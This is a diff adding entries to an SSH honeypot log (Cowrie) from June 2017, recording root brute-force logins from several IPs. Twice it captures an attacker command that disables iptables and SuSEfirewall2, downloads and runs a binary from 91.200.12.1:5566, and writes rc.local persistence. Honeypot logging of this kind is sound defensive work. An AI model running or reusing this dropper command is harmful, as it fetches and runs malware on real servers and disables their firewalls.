@@ -2913,3 +2913,187 @@
 2017-06-14T12:20:56+0000 [HoneyPotSSHTransport,29950,113.195.145.52] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
 2017-06-14T12:20:56+0000 [HoneyPotSSHTransport,29950,113.195.145.52] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
 2017-06-14T12:20:56+0000 [HoneyPotSSHTransport,29950,113.195.145.52] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-14T12:21:07+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 221.229.166.44:2516 (10.8.41.81:2222) [session: 6f631778]
+2017-06-14T12:21:07+0000 [HoneyPotSSHTransport,29951,221.229.166.44] Remote SSH version: SSH-2.0-libssh2_1.4.3
+2017-06-14T12:21:07+0000 [HoneyPotSSHTransport,29951,221.229.166.44] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-14T12:21:07+0000 [HoneyPotSSHTransport,29951,221.229.166.44] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-14T12:21:07+0000 [HoneyPotSSHTransport,29951,221.229.166.44] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-14T12:21:08+0000 [HoneyPotSSHTransport,29951,221.229.166.44] NEW KEYS
+2017-06-14T12:21:09+0000 [HoneyPotSSHTransport,29951,221.229.166.44] starting service 'ssh-userauth'
+2017-06-14T12:21:09+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,29951,221.229.166.44] 'root' trying auth 'password'
+2017-06-14T12:21:10+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,29951,221.229.166.44] first time for 221.229.166.44, need: 1
+2017-06-14T12:21:10+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,29951,221.229.166.44] login attempt: 1
+2017-06-14T12:21:12+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,29951,221.229.166.44] login attempt [root/root123] succeeded
+2017-06-14T12:21:14+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,29951,221.229.166.44] 'root' authenticated with 'password'
+2017-06-14T12:21:14+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,29951,221.229.166.44] starting service 'ssh-connection'
+2017-06-14T12:21:14+0000 [HoneyPotSSHTransport,29951,221.229.166.44] avatar root logging out
+2017-06-14T12:21:14+0000 [HoneyPotSSHTransport,29951,221.229.166.44] connection lost
+2017-06-14T12:21:14+0000 [HoneyPotSSHTransport,29951,221.229.166.44] Connection lost after 7 seconds
+2017-06-14T12:21:18+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 91.200.12.1:57765 (10.8.41.81:2222) [session: 45cd55ff]
+2017-06-14T12:21:18+0000 [HoneyPotSSHTransport,29952,91.200.12.1] Remote SSH version: SSH-2.0-PuTTY_Local:_May_14_2009_21:12:18
+2017-06-14T12:21:18+0000 [HoneyPotSSHTransport,29952,91.200.12.1] kex alg, key alg: 'diffie-hellman-group-exchange-sha256' 'ssh-dss'
+2017-06-14T12:21:18+0000 [HoneyPotSSHTransport,29952,91.200.12.1] outgoing: 'aes256-ctr' 'hmac-sha1' 'zlib'
+2017-06-14T12:21:18+0000 [HoneyPotSSHTransport,29952,91.200.12.1] incoming: 'aes256-ctr' 'hmac-sha1' 'zlib'
+2017-06-14T12:21:19+0000 [HoneyPotSSHTransport,29952,91.200.12.1] NEW KEYS
+2017-06-14T12:21:19+0000 [HoneyPotSSHTransport,29952,91.200.12.1] starting service 'ssh-userauth'
+2017-06-14T12:21:20+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,29952,91.200.12.1] 'root' trying auth 'none'
+2017-06-14T12:21:22+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,29952,91.200.12.1] 'root' authenticated with 'none'
+2017-06-14T12:21:22+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,29952,91.200.12.1] starting service 'ssh-connection'
+2017-06-14T12:21:22+0000 [HoneyPotSSHTransport,29949,113.195.145.52] connection lost
+2017-06-14T12:21:22+0000 [HoneyPotSSHTransport,29949,113.195.145.52] Connection lost after 39 seconds
+2017-06-14T12:21:22+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,29952,91.200.12.1] got channel 'session' request
+2017-06-14T12:21:22+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,29952,91.200.12.1] channel open
+2017-06-14T12:21:22+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,29952,91.200.12.1] executing command "/etc/init.d/iptables stop;
+	service iptables stop;
+	SuSEfirewall2 stop;
+	reSuSEfirewall2 stop;
+	cd ..;
+	cd ..;
+	cd /tmp;
+	rm -f *;
+	
+	wget -c http://91.200.12.1:5566/u6789;
+	chmod 777 u6789;
+	./u6789;
+	echo "cd /tmp/">>/etc/rc.local;
+	echo "./u6789&">>/etc/rc.local;
+	echo "/etc/init.d/iptables stop">>/etc/rc.local;"
+2017-06-14T12:21:22+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,29952,91.200.12.1] Opening TTY Log: log/tty/20170614-122122-45cd55ff-0e.log
+2017-06-14T12:21:22+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,29952,91.200.12.1] CMD: /etc/init.d/iptables stop;
+	service iptables stop;
+	SuSEfirewall2 stop;
+	reSuSEfirewall2 stop;
+	cd ..;
+	cd ..;
+	cd /tmp;
+	rm -f *;
+	
+	wget -c http://91.200.12.1:5566/u6789;
+	chmod 777 u6789;
+	./u6789;
+	echo "cd /tmp/">>/etc/rc.local;
+	echo "./u6789&">>/etc/rc.local;
+	echo "/etc/init.d/iptables stop">>/etc/rc.local;
+2017-06-14T12:21:22+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,29952,91.200.12.1] Command not found: /etc/init.d/iptables stop
+2017-06-14T12:21:22+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,29952,91.200.12.1] Command found: service iptables stop
+2017-06-14T12:21:22+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,29952,91.200.12.1] Command not found: SuSEfirewall2 stop
+2017-06-14T12:21:22+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,29952,91.200.12.1] Command not found: reSuSEfirewall2 stop
+2017-06-14T12:21:22+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,29952,91.200.12.1] Command found: cd /
+2017-06-14T12:21:22+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,29952,91.200.12.1] Command found: cd /
+2017-06-14T12:21:23+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,29952,91.200.12.1] Command found: cd /tmp
+2017-06-14T12:21:23+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,29952,91.200.12.1] Command found: rm -f /tmp/.X11-unix /tmp/.ICE-unix
+2017-06-14T12:21:23+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,29952,91.200.12.1] Command found: wget -c http://91.200.12.1:5566/u6789
+2017-06-14T12:21:23+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://91.200.12.1:5566/u6789>
+2017-06-14T12:21:25+0000 [HTTPPageDownloader,client] Downloaded URL (http://91.200.12.1:5566/u6789) with SHA-256 23a91d190440fc1c4a8889e2359d593716497f78b71f421365b9bdd1772abcec to dl/23a91d190440fc1c4a8889e2359d593716497f78b71f421365b9bdd1772abcec
+2017-06-14T12:21:25+0000 [HTTPPageDownloader,client] Command found: chmod 777 /tmp/u6789
+2017-06-14T12:21:25+0000 [HTTPPageDownloader,client] Command not found: ./u6789
+2017-06-14T12:21:25+0000 [HTTPPageDownloader,client] Command found: echo "cd /tmp/" >> /etc/rc.local
+2017-06-14T12:21:25+0000 [HTTPPageDownloader,client] Command found: echo "./u6789&" >> /etc/rc.local
+2017-06-14T12:21:25+0000 [HTTPPageDownloader,client] Command found: echo "/etc/init.d/iptables stop" >> /etc/rc.local
+2017-06-14T12:21:25+0000 [HTTPPageDownloader,client] exitCode: 0
+2017-06-14T12:21:25+0000 [HTTPPageDownloader,client] sending request 'exit-status'
+2017-06-14T12:21:25+0000 [HTTPPageDownloader,client] Not storing duplicate content 23a91d190440fc1c4a8889e2359d593716497f78b71f421365b9bdd1772abcec
+2017-06-14T12:21:25+0000 [HTTPPageDownloader,client] Saved redir contents with SHA-256 23a91d190440fc1c4a8889e2359d593716497f78b71f421365b9bdd1772abcec to dl/23a91d190440fc1c4a8889e2359d593716497f78b71f421365b9bdd1772abcec
+2017-06-14T12:21:25+0000 [HTTPPageDownloader,client] Closing TTY Log: log/tty/20170614-122122-45cd55ff-0e.log after 2 seconds
+2017-06-14T12:21:25+0000 [HTTPPageDownloader,client] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-06-14T12:21:25+0000 [HTTPPageDownloader,client] sending close 0
+2017-06-14T12:21:25+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://91.200.12.1:5566/u6789>
+2017-06-14T12:21:26+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.52:27425 (10.8.41.81:2222) [session: 025d1dbb]
+2017-06-14T12:21:26+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,29952,91.200.12.1] remote close
+2017-06-14T12:21:26+0000 [HoneyPotSSHTransport,29952,91.200.12.1] avatar root logging out
+2017-06-14T12:21:26+0000 [HoneyPotSSHTransport,29952,91.200.12.1] connection lost
+2017-06-14T12:21:26+0000 [HoneyPotSSHTransport,29952,91.200.12.1] Connection lost after 7 seconds
+2017-06-14T12:21:26+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 91.200.12.1:59140 (10.8.41.81:2222) [session: 11675015]
+2017-06-14T12:21:26+0000 [HoneyPotSSHTransport,29954,91.200.12.1] Remote SSH version: SSH-2.0-PuTTY_Local:_May_14_2009_21:12:18
+2017-06-14T12:21:26+0000 [HoneyPotSSHTransport,29954,91.200.12.1] kex alg, key alg: 'diffie-hellman-group-exchange-sha256' 'ssh-dss'
+2017-06-14T12:21:26+0000 [HoneyPotSSHTransport,29954,91.200.12.1] outgoing: 'aes256-ctr' 'hmac-sha1' 'zlib'
+2017-06-14T12:21:26+0000 [HoneyPotSSHTransport,29954,91.200.12.1] incoming: 'aes256-ctr' 'hmac-sha1' 'zlib'
+2017-06-14T12:21:27+0000 [HoneyPotSSHTransport,29953,113.195.145.52] Remote SSH version: SSH-2.0-PUTTY
+2017-06-14T12:21:27+0000 [HoneyPotSSHTransport,29953,113.195.145.52] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-14T12:21:27+0000 [HoneyPotSSHTransport,29953,113.195.145.52] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-14T12:21:27+0000 [HoneyPotSSHTransport,29953,113.195.145.52] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-14T12:21:27+0000 [HoneyPotSSHTransport,29954,91.200.12.1] NEW KEYS
+2017-06-14T12:21:27+0000 [HoneyPotSSHTransport,29954,91.200.12.1] starting service 'ssh-userauth'
+2017-06-14T12:21:28+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,29954,91.200.12.1] 'root' trying auth 'none'
+2017-06-14T12:21:29+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,29954,91.200.12.1] 'root' authenticated with 'none'
+2017-06-14T12:21:29+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,29954,91.200.12.1] starting service 'ssh-connection'
+2017-06-14T12:21:29+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,29954,91.200.12.1] got channel 'session' request
+2017-06-14T12:21:29+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,29954,91.200.12.1] channel open
+2017-06-14T12:21:29+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,29954,91.200.12.1] executing command "/etc/init.d/iptables stop;
+	service iptables stop;
+	SuSEfirewall2 stop;
+	reSuSEfirewall2 stop;
+	cd ..;
+	cd ..;
+	cd /tmp;
+	rm -f *;
+	
+	wget -c http://91.200.12.1:5566/u6789;
+	chmod 777 u6789;
+	./u6789;
+	echo "cd /tmp/">>/etc/rc.local;
+	echo "./u6789&">>/etc/rc.local;
+	echo "/etc/init.d/iptables stop">>/etc/rc.local;"
+2017-06-14T12:21:29+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,29954,91.200.12.1] Opening TTY Log: log/tty/20170614-122129-11675015-0e.log
+2017-06-14T12:21:29+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,29954,91.200.12.1] CMD: /etc/init.d/iptables stop;
+	service iptables stop;
+	SuSEfirewall2 stop;
+	reSuSEfirewall2 stop;
+	cd ..;
+	cd ..;
+	cd /tmp;
+	rm -f *;
+	
+	wget -c http://91.200.12.1:5566/u6789;
+	chmod 777 u6789;
+	./u6789;
+	echo "cd /tmp/">>/etc/rc.local;
+	echo "./u6789&">>/etc/rc.local;
+	echo "/etc/init.d/iptables stop">>/etc/rc.local;
+2017-06-14T12:21:29+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,29954,91.200.12.1] Command not found: /etc/init.d/iptables stop
+2017-06-14T12:21:29+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,29954,91.200.12.1] Command found: service iptables stop
+2017-06-14T12:21:29+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,29954,91.200.12.1] Command not found: SuSEfirewall2 stop
+2017-06-14T12:21:29+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,29954,91.200.12.1] Command not found: reSuSEfirewall2 stop
+2017-06-14T12:21:29+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,29954,91.200.12.1] Command found: cd /
+2017-06-14T12:21:29+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,29954,91.200.12.1] Command found: cd /
+2017-06-14T12:21:29+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,29954,91.200.12.1] Command found: cd /tmp
+2017-06-14T12:21:29+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,29954,91.200.12.1] Command found: rm -f /tmp/.X11-unix /tmp/.ICE-unix
+2017-06-14T12:21:29+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,29954,91.200.12.1] Command found: wget -c http://91.200.12.1:5566/u6789
+2017-06-14T12:21:29+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://91.200.12.1:5566/u6789>
+2017-06-14T12:21:30+0000 [HoneyPotSSHTransport,29953,113.195.145.52] NEW KEYS
+2017-06-14T12:21:30+0000 [HoneyPotSSHTransport,29950,113.195.145.52] connection lost
+2017-06-14T12:21:30+0000 [HoneyPotSSHTransport,29950,113.195.145.52] Connection lost after 37 seconds
+2017-06-14T12:21:30+0000 [HoneyPotSSHTransport,29953,113.195.145.52] starting service 'ssh-userauth'
+2017-06-14T12:21:31+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,29953,113.195.145.52] 'root' trying auth 'none'
+2017-06-14T12:21:32+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,29953,113.195.145.52] 'root' authenticated with 'none'
+2017-06-14T12:21:32+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,29953,113.195.145.52] starting service 'ssh-connection'
+2017-06-14T12:21:33+0000 [HTTPPageDownloader,client] Not storing duplicate content 23a91d190440fc1c4a8889e2359d593716497f78b71f421365b9bdd1772abcec
+2017-06-14T12:21:33+0000 [HTTPPageDownloader,client] Downloaded URL (http://91.200.12.1:5566/u6789) with SHA-256 23a91d190440fc1c4a8889e2359d593716497f78b71f421365b9bdd1772abcec to dl/23a91d190440fc1c4a8889e2359d593716497f78b71f421365b9bdd1772abcec
+2017-06-14T12:21:33+0000 [HTTPPageDownloader,client] Command found: chmod 777 /tmp/u6789
+2017-06-14T12:21:33+0000 [HTTPPageDownloader,client] Command not found: ./u6789
+2017-06-14T12:21:33+0000 [HTTPPageDownloader,client] Command found: echo "cd /tmp/" >> /etc/rc.local
+2017-06-14T12:21:33+0000 [HTTPPageDownloader,client] Command found: echo "./u6789&" >> /etc/rc.local
+2017-06-14T12:21:33+0000 [HTTPPageDownloader,client] Command found: echo "/etc/init.d/iptables stop" >> /etc/rc.local
+2017-06-14T12:21:33+0000 [HTTPPageDownloader,client] exitCode: 0
+2017-06-14T12:21:33+0000 [HTTPPageDownloader,client] sending request 'exit-status'
+2017-06-14T12:21:33+0000 [HTTPPageDownloader,client] Not storing duplicate content 23a91d190440fc1c4a8889e2359d593716497f78b71f421365b9bdd1772abcec
+2017-06-14T12:21:33+0000 [HTTPPageDownloader,client] Saved redir contents with SHA-256 23a91d190440fc1c4a8889e2359d593716497f78b71f421365b9bdd1772abcec to dl/23a91d190440fc1c4a8889e2359d593716497f78b71f421365b9bdd1772abcec
+2017-06-14T12:21:33+0000 [HTTPPageDownloader,client] Closing TTY Log: log/tty/20170614-122129-11675015-0e.log after 3 seconds
+2017-06-14T12:21:33+0000 [HTTPPageDownloader,client] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-06-14T12:21:33+0000 [HTTPPageDownloader,client] sending close 0
+2017-06-14T12:21:33+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://91.200.12.1:5566/u6789>
+2017-06-14T12:21:33+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,29954,91.200.12.1] remote close
+2017-06-14T12:21:33+0000 [HoneyPotSSHTransport,29954,91.200.12.1] avatar root logging out
+2017-06-14T12:21:33+0000 [HoneyPotSSHTransport,29954,91.200.12.1] connection lost
+2017-06-14T12:21:33+0000 [HoneyPotSSHTransport,29954,91.200.12.1] Connection lost after 7 seconds
+2017-06-14T12:21:47+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 129.146.31.194:58114 (10.8.41.81:2222) [session: 29024240]
+2017-06-14T12:21:47+0000 [HoneyPotSSHTransport,29955,129.146.31.194] Remote SSH version: SSH-2.0-libssh2_1.6.0
+2017-06-14T12:21:47+0000 [HoneyPotSSHTransport,29955,129.146.31.194] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-14T12:21:47+0000 [HoneyPotSSHTransport,29955,129.146.31.194] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-14T12:21:47+0000 [HoneyPotSSHTransport,29955,129.146.31.194] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-14T12:21:51+0000 [HoneyPotSSHTransport,29955,129.146.31.194] NEW KEYS
+2017-06-14T12:21:51+0000 [HoneyPotSSHTransport,29955,129.146.31.194] starting service 'ssh-userauth'
+2017-06-14T12:21:51+0000 [HoneyPotSSHTransport,29955,129.146.31.194] connection lost
+2017-06-14T12:21:51+0000 [HoneyPotSSHTransport,29955,129.146.31.194] Connection lost after 4 seconds
